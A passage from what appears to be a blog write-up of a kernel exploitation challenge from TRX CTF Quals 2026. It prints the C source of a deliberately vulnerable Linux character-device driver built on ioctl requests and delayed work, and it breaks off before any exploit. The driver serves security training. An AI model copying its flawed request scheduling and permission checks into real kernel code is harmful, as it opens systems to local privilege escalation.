@@ -1,0 +1,512 @@
+<!doctype html><html lang=en><head><title>krwd - TRX CTF Quals 2026 &ndash; kqx</title>
+<meta name=description content="kernel pwn and browser exploitation"><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=UTF-8><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=https://kqx.io/css/palettes/base16-dark.css><link rel=stylesheet href=https://kqx.io/css/risotto.css><link rel=icon href=https://kqx.io/images/favicon.ico><meta property="og:title" content="krwd - TRX CTF Quals 2026 &ndash; kqx"><meta property="og:url" content="https://kqx.io/writeups/krwd/"><meta property="og:type" content="website"><meta property="og:description" content="kernel pwn challenge that I wrote for TRX CTF 2026"><meta property="og:image" content="https://kqx.io/images/banner.jpg"></head><body><div class=page><header class=page__header><nav class="page__nav main-nav"><ul><li class=nomarker><h1 class=page__logo><a href=https://kqx.io/ class=page__logo-inner>kqx</a></h1></li><li class=main-nav__item><a class=nav-main-item href=https://kqx.io/about/ title>about</a></li><li class=main-nav__item><a class=nav-main-item href=https://kqx.io/post/ title>posts</a></li><li class=main-nav__item><a class=nav-main-item href=https://kqx.io/writeups/ title>writeups</a></li></ul></nav></header><section class=page__body><header><h1>krwd - TRX CTF Quals 2026</h1></header><div><h2 id=description>Description</h2><blockquote><p><em>The solution to all your problems is right here -> <a href=https://kqx.io>https://kqx.io</a></em></p></blockquote><h2 id=source-code>Source code</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/init.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/module.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/device.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/kernel.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/version.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/uaccess.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/ioctl.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/fs.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/cred.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/namei.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/mutex.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/sched.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/workqueue.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/jiffies.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>MODULE_LICENSE</span>(<span style=color:#e6db74>&#34;GPL&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define CHALL_DEVICE_NAME           &#34;chall&#34;
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define CHALL_DEVICE_CLASS_NAME     &#34;chall_class&#34;
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/* IOCTL command definitions */</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define IOCTL_CHALL_MAGIC               &#39;E&#39;
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define IOCTL_CHALL_ADD_REQUEST         _IOW(IOCTL_CHALL_MAGIC, 0, struct urequest *)
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define IOCTL_CHALL_SET_WORK            _IOW(IOCTL_CHALL_MAGIC, 3, struct urequest *)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#define CHALL_KBUF_SIZE                 0x0400
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define CHALL_KBUFS_MAX_SIZE            0x0050
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define CHALL_KREQUESTS_MAX_SIZE        0x0020
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span>                        chall_major;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>struct</span> class              <span style=color:#f92672>*</span>chall_dev_class  <span style=color:#f92672>=</span> NULL;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>struct</span> device             <span style=color:#f92672>*</span>chall_dev        <span style=color:#f92672>=</span> NULL;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span>     <span style=color:#a6e22e>chall_open</span>(<span style=color:#66d9ef>struct</span> inode <span style=color:#f92672>*</span>inodep, <span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>filep);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span>     <span style=color:#a6e22e>chall_release</span>(<span style=color:#66d9ef>struct</span> inode <span style=color:#f92672>*</span>inodep, <span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>filep);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>long</span>    <span style=color:#a6e22e>chall_ioctl</span>(<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>filep, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> cmd, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> arg);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#a6e22e>DEFINE_MUTEX</span>(chall_ctx_mutex);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>struct</span> file_operations chall_fops <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>    .open           <span style=color:#f92672>=</span> chall_open,
+</span></span><span style=display:flex><span>    .release        <span style=color:#f92672>=</span> chall_release,
+</span></span><span style=display:flex><span>    .unlocked_ioctl <span style=color:#f92672>=</span> chall_ioctl,
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>enum</span> krequest_type {
+</span></span><span style=display:flex><span>    TYPE_READ,      
+</span></span><span style=display:flex><span>    TYPE_WRITE,
+</span></span><span style=display:flex><span>    TYPE_DELETE,
+</span></span><span style=display:flex><span>    TYPE_SET_WORK       
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>enum</span> krequest_status {
+</span></span><span style=display:flex><span>    REQ_FREE,
+</span></span><span style=display:flex><span>    REQ_PENDING
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>union</span> request_info {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>size_t</span> size;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> __user ubuf;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>size_t</span> kbuf_idx;
+</span></span><span style=display:flex><span>    } rw;
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>size_t</span> kbuf_idx;
+</span></span><span style=display:flex><span>    } delete;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>size_t</span> kreq_idx;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> time;
+</span></span><span style=display:flex><span>    } work;
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> krequest {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>pid_t</span> pid;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uid_t</span> uid;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>gid_t</span> gid;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>enum</span> krequest_type type;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>enum</span> krequest_status status;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>union</span> request_info info;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> delayed_work dwork;
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> urequest {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>enum</span> krequest_type type;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>union</span> request_info info;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>size_t</span> req_idx;
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>enum</span> kbuf_status {
+</span></span><span style=display:flex><span>    KBUF_FREE,
+</span></span><span style=display:flex><span>    KBUF_IN_USE
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> kbuf {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>pid_t</span> pid;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uid_t</span> uid;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>gid_t</span> gid;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>enum</span> kbuf_status status;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> buf[CHALL_KBUF_SIZE];
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>struct</span> krequest krequests[CHALL_KREQUESTS_MAX_SIZE] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>};
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>struct</span> kbuf kbufs[CHALL_KBUFS_MAX_SIZE] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>long</span> <span style=color:#a6e22e>check_perms</span>(<span style=color:#66d9ef>struct</span> krequest<span style=color:#f92672>*</span> kreq){
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>size_t</span> kbuf_idx;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>switch</span> (kreq<span style=color:#f92672>-&gt;</span>type){
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> TYPE_READ:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> TYPE_WRITE:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> TYPE_DELETE:
+</span></span><span style=display:flex><span>        kbuf_idx <span style=color:#f92672>=</span> (kreq<span style=color:#f92672>-&gt;</span>type <span style=color:#f92672>==</span> TYPE_DELETE)<span style=color:#f92672>?</span> kreq<span style=color:#f92672>-&gt;</span>info.delete.kbuf_idx : kreq<span style=color:#f92672>-&gt;</span>info.rw.kbuf_idx;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(kbuf_idx <span style=color:#f92672>&gt;=</span> CHALL_KBUFS_MAX_SIZE)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span>EINVAL;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (kbufs[kbuf_idx].status <span style=color:#f92672>==</span> KBUF_FREE)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(kreq<span style=color:#f92672>-&gt;</span>uid <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> kreq<span style=color:#f92672>-&gt;</span>gid <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (kbufs[kbuf_idx].uid <span style=color:#f92672>!=</span> kreq<span style=color:#f92672>-&gt;</span>uid <span style=color:#f92672>||</span>
+</span></span><span style=display:flex><span>            kbufs[kbuf_idx].gid <span style=color:#f92672>!=</span> kreq<span style=color:#f92672>-&gt;</span>gid <span style=color:#f92672>||</span>
+</span></span><span style=display:flex><span>            kbufs[kbuf_idx].pid <span style=color:#f92672>!=</span> kreq<span style=color:#f92672>-&gt;</span>pid)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span>EPERM;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span>EINVAL;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>request_handler</span>(<span style=color:#66d9ef>struct</span> work_struct<span style=color:#f92672>*</span> work)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#75715e>/* Get the request */</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> krequest<span style=color:#f92672>*</span> kreq;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> kbuf<span style=color:#f92672>*</span> kbuf;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>size_t</span> kbuf_idx;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mutex_lock</span>(<span style=color:#f92672>&amp;</span>chall_ctx_mutex);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    kreq <span style=color:#f92672>=</span> <span style=color:#a6e22e>container_of</span>(work, <span style=color:#66d9ef>struct</span> krequest, dwork.work);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>check_perms</span>(kreq) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> handler_exit;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    kbuf_idx <span style=color:#f92672>=</span> (kreq<span style=color:#f92672>-&gt;</span>type <span style=color:#f92672>==</span> TYPE_DELETE)<span style=color:#f92672>?</span> kreq<span style=color:#f92672>-&gt;</span>info.delete.kbuf_idx : kreq<span style=color:#f92672>-&gt;</span>info.rw.kbuf_idx;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    kbuf <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>kbufs[kbuf_idx];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(kbuf<span style=color:#f92672>-&gt;</span>status <span style=color:#f92672>==</span> KBUF_FREE) {
+</span></span><span style=display:flex><span>        kbuf<span style=color:#f92672>-&gt;</span>status <span style=color:#f92672>=</span> KBUF_IN_USE;
+</span></span><span style=display:flex><span>        kbuf<span style=color:#f92672>-&gt;</span>uid <span style=color:#f92672>=</span> kreq<span style=color:#f92672>-&gt;</span>uid;
+</span></span><span style=display:flex><span>        kbuf<span style=color:#f92672>-&gt;</span>gid <span style=color:#f92672>=</span> kreq<span style=color:#f92672>-&gt;</span>gid;
+</span></span><span style=display:flex><span>        kbuf<span style=color:#f92672>-&gt;</span>pid <span style=color:#f92672>=</span> kreq<span style=color:#f92672>-&gt;</span>pid;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>switch</span> (kreq<span style=color:#f92672>-&gt;</span>type) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> TYPE_READ:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>copy_to_user</span>(kreq<span style=color:#f92672>-&gt;</span>info.rw.ubuf, kbuf<span style=color:#f92672>-&gt;</span>buf, (kreq<span style=color:#f92672>-&gt;</span>info.rw.size <span style=color:#f92672>&lt;</span> CHALL_KBUF_SIZE)<span style=color:#f92672>?</span> kreq<span style=color:#f92672>-&gt;</span>info.rw.size : CHALL_KBUF_SIZE))
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>goto</span> handler_exit;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> TYPE_WRITE:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>copy_from_user</span>(kbuf<span style=color:#f92672>-&gt;</span>buf, kreq<span style=color:#f92672>-&gt;</span>info.rw.ubuf, (kreq<span style=color:#f92672>-&gt;</span>info.rw.size <span style=color:#f92672>&lt;</span> CHALL_KBUF_SIZE)<span style=color:#f92672>?</span> kreq<span style=color:#f92672>-&gt;</span>info.rw.size : CHALL_KBUF_SIZE))
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>goto</span> handler_exit;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> TYPE_DELETE:
+</span></span><span style=display:flex><span>        kbuf<span style=color:#f92672>-&gt;</span>status <span style=color:#f92672>=</span> KBUF_FREE;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>handler_exit:
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mutex_unlock</span>(<span style=color:#f92672>&amp;</span>chall_ctx_mutex);
+</span></span><span style=display:flex><span>    kreq<span style=color:#f92672>-&gt;</span>status <span style=color:#f92672>=</span> REQ_FREE;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>long</span> <span style=color:#a6e22e>request_add</span>(<span style=color:#66d9ef>struct</span> urequest<span style=color:#f92672>*</span> ureq)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>long</span> fidx, i;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>, fidx <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>; i <span style=color:#f92672>&lt;</span> CHALL_KREQUESTS_MAX_SIZE; <span style=color:#f92672>++</span>i) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (krequests[i].status <span style=color:#f92672>==</span> REQ_FREE){
+</span></span><span style=display:flex><span>            fidx <span style=color:#f92672>=</span> i;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(fidx <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> fidx;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>switch</span> (ureq<span style=color:#f92672>-&gt;</span>type) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> TYPE_READ:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> TYPE_WRITE:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> TYPE_DELETE:
+</span></span><span style=display:flex><span>        krequests[fidx].uid <span style=color:#f92672>=</span> <span style=color:#a6e22e>from_kuid</span>(<span style=color:#a6e22e>current_user_ns</span>(), <span style=color:#a6e22e>current_uid</span>());
+</span></span><span style=display:flex><span>        krequests[fidx].gid <span style=color:#f92672>=</span> <span style=color:#a6e22e>from_kgid</span>(<span style=color:#a6e22e>current_user_ns</span>(), <span style=color:#a6e22e>current_gid</span>());
+</span></span><span style=display:flex><span>        krequests[fidx].pid <span style=color:#f92672>=</span> <span style=color:#a6e22e>task_pid_nr</span>(current);
+</span></span><span style=display:flex><span>        krequests[fidx].type <span style=color:#f92672>=</span> ureq<span style=color:#f92672>-&gt;</span>type;
+</span></span><span style=display:flex><span>        krequests[fidx].status <span style=color:#f92672>=</span> REQ_PENDING;
+</span></span><span style=display:flex><span>        krequests[fidx].info <span style=color:#f92672>=</span> ureq<span style=color:#f92672>-&gt;</span>info;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    ureq<span style=color:#f92672>-&gt;</span>req_idx <span style=color:#f92672>=</span> fidx;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>long</span> <span style=color:#a6e22e>chall_ioctl</span>(<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>filep, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> cmd, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> arg)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> urequest ureq;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>long</span> r <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mutex_lock</span>(<span style=color:#f92672>&amp;</span>chall_ctx_mutex);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>copy_from_user</span>(<span style=color:#f92672>&amp;</span>ureq, (<span style=color:#66d9ef>struct</span> urequest <span style=color:#f92672>*</span>)arg, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> urequest)) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>){
+</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> <span style=color:#f92672>-</span>EFAULT;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> ioctl_exit;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>switch</span> (cmd) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> IOCTL_CHALL_ADD_REQUEST:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>request_add</span>(<span style=color:#f92672>&amp;</span>ureq) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>){
+</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> <span style=color:#f92672>-</span>ENOSPC;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>goto</span> ioctl_exit;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>copy_to_user</span>((<span style=color:#66d9ef>struct</span> urequest <span style=color:#f92672>*</span> )arg, <span style=color:#f92672>&amp;</span>ureq, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> urequest)) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>){
+</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> <span style=color:#f92672>-</span>EFAULT;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>goto</span> ioctl_exit;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> IOCTL_CHALL_SET_WORK:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (ureq.type <span style=color:#f92672>!=</span> TYPE_SET_WORK <span style=color:#f92672>||</span> ureq.info.work.kreq_idx <span style=color:#f92672>&gt;=</span> CHALL_KREQUESTS_MAX_SIZE){
+</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> <span style=color:#f92672>-</span>EINVAL;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>goto</span> ioctl_exit;
+</span></span><span style=display:flex><span>        }        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>/* Set async work*/</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>INIT_DELAYED_WORK</span>(<span style=color:#f92672>&amp;</span>krequests[ureq.info.work.kreq_idx].dwork, request_handler);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>schedule_delayed_work</span>(<span style=color:#f92672>&amp;</span>krequests[ureq.info.work.kreq_idx].dwork, <span style=color:#a6e22e>msecs_to_jiffies</span>(ureq.info.work.time));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> <span style=color:#f92672>-</span>EINVAL;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ioctl_exit:
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mutex_unlock</span>(<span style=color:#f92672>&amp;</span>chall_ctx_mutex);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> r;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> __init <span style=color:#a6e22e>chall_init</span>(<span style=color:#66d9ef>void</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> i;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printk</span>(KERN_INFO <span style=color:#e6db74>&#34;chall: Initializing driver</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
